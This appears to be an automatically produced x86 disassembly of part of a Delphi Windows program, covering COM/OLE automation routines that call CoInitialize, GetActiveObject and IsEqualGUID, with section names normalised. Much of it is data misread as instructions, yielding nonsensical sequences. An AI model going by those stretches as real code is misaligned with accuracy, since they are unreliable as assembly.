mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_4625b0
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_462238
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f174
sub_462744
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_462809
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_461b48
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4041f4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_4041f4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_461c18
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462810
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f90
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4039a8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404b0c
jmp r-xdata
sub_462834
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_462824
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_462744
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_462918
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_462834
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_462949 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f174
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4629f4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_4176d8
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_4176d8
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_462a6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462ae2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ae9
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404a20
call CoUninitialize
sub_462aec
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_462034
mov eax sub_4626a8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_462918
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4629f4
sub_462b44
push 0xff004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462b91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462b98
retn
sub_462ba4
test al 0x2b
inc esi
add [ ecx ] dl
or eax 0x72615654
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add al bh
adc [ eax ] al
or al 0x0
add [ eax ] al
clc
adc [ eax ] al
or [ edi + 0x6c ] ecx
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
xchg esi eax
sub al 0x46
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
xchg esi eax
sub al 0x46
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cmp al 0x2d
inc esi
add [ edx + 0x462c ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x100046 ] bh
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esp + edx * 2 ] dl
push ebx
jb r-xdata
jb r-xdata
add dl ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462b91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462b98
retn
inc eax
add al bl
sub eax [ esi ]
add ecx [ esp + edx * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
inc esi
jb r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
aam 0x2b
inc esi
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
add [ ebx ] al
or al 0x54
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
cld
xor eax [ esi ]
movsb [ edi ] [ esi ]
xor [ esi ] eax
sbb al 0x2a
inc eax
add [ eax + 0x32 ] dh
inc esi
add [ edx + esi + 0x46 ] ch
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
inc esp
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ eax ] al
add [ eax ] al
jbe r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
int3
jb r-xdata
add [ eax ] dl
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
inc esi
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
sub [ 0x46 ] 0x0
add [ esi + ebp ] dh
inc esi
add [ eax + 0x2e ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2e ] al
add [ eax ] al
add [ eax ] al
xor al 0x2e
outsb
je r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463182
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_462ba4 ]
call sub_4051d0
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_40501c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp sub_462f84
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp r-xdata
outsb
jae r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add al bh
xor [ esi ] eax
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ eax + 0x32 ] cl
inc esi
add [ eax - 0x2 ] bl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc eax
add [ eax + 0x2e ] bl
inc esi
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
ja r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
outsd
je r-xdata
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
add [ edi + 0x2c ] dl
inc esi
add [ ecx + 0x2c ] ah
inc esi
add [ ebx + 0x2c ] ch
inc esi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
inc esi
sub eax 0x8b640046
inc ecx
add [ 0x6c4f0900 ] al
push ebx
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f49c
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f49c
inc ebx
dec edi
jne r-xdata
jmp r-xdata
sub al 0x46
add [ ebp + 0x2c ] cl
inc esi
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_462f74
mov eax ebx
call sub_4032d0
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
dec ebp
sub al 0x46
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add al ah
xor eax [ esi ]
clc
add [ eax ] al
adc [ eax ] al
loopne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_462ba4 ]
call sub_4051d0
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463189
lea eax [ ebp - 0x4 ]
mov edx [ sub_462ba4 ]
call sub_4052f0
retn
inc edi
inc edi
add [ eax ] al
test dl dl
je r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 8 + 0x2b ] si
inc esi
add al cl
xor eax [ esi ]
fdiv [ ebx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
xor eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
inc esi
add al bh
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f49c
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f49c
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
sub_462d77
push ebp
sub eax 0x2d630046
inc esi
add [ ebp + 0x2d ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
ja r-xdata
inc esi
add [ eax ] dl
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
sub [ 0x46 ] 0x0
add [ esi + ebp ] dh
inc esi
add [ eax + 0x2e ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2e ] al
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
cld
xor eax [ esi ]
movsb [ edi ] [ esi ]
xor [ esi ] eax
sbb al 0x2a
inc eax
add [ eax + 0x32 ] dh
inc esi
add [ edx + esi + 0x46 ] ch
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
inc esp
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
int3
jb r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add al bh
xor [ esi ] eax
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ eax + 0x32 ] cl
inc esi
add [ eax - 0x2 ] bl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc eax
add [ eax + 0x2e ] bl
inc esi
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
outsd
je r-xdata
jb r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
inc esi
sub eax 0x8b640046
inc ecx
add [ 0x6c4f0900 ] al
push ebx
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_462f74
mov eax ebx
call sub_4032d0
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add al ah
xor eax [ esi ]
clc
add [ eax ] al
adc [ eax ] al
loopne r-xdata
add [ eax ] al
test dl dl
je r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 8 + 0x2b ] si
inc esi
add al cl
xor eax [ esi ]
fdiv [ ebx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
xor eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
inc esi
add al bh
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_462f20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_462f74
mov eax ebx
call sub_4032d0
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_462f84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_463424
sub_462fa4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_463434
sub_4631a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fb3c
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_462ef4
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4631f8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_463194
mov eax [ esi + 0x38 ]
push eax
call sub_462fa4
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_40321c
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_463248
push ebx
mov ebx eax
mov eax ebx
call sub_41ff8c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4633e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_463270
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4633ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4633c8
sub al 0x1
jb r-xdata
mov eax esi
call sub_40599c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_4176d8
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4633c1
lea eax [ ebp - 0x24 ]
call sub_404678
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_461d3c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_461d3c
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40599c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_4176d8
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_461d10
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_461ce4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_408f58
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_461b48
call sub_4039a8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_4047c4
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_461d74
jmp r-xdata
sub_4633fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_463444
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463469
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463470
retn
sub_463490
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4634b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634bc
retn
sub_4634c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4634ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634f4
retn
sub_463500
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463525
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46352c
retn
sub_463538
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46355d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463564
retn
sub_463570
mov esp 0x4635
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ eax + eax ] dl
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add [ edx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004636 ] ch
add [ eax ] al
add [ edx + edx ] ch
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
mov eax eax
test al 0x36
inc esi
je r-xdata
mov ebp 0xc5004636
jb r-xdata
add ah al
xor eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fidiv [ 0x1c0046 ]
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
sbb al 0x3c
inc esi
add [ eax + 0x3c ] cl
inc esi
add [ edx + ebp ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
add [ eax ] al
insd
inc ecx
popad
add al 0x24
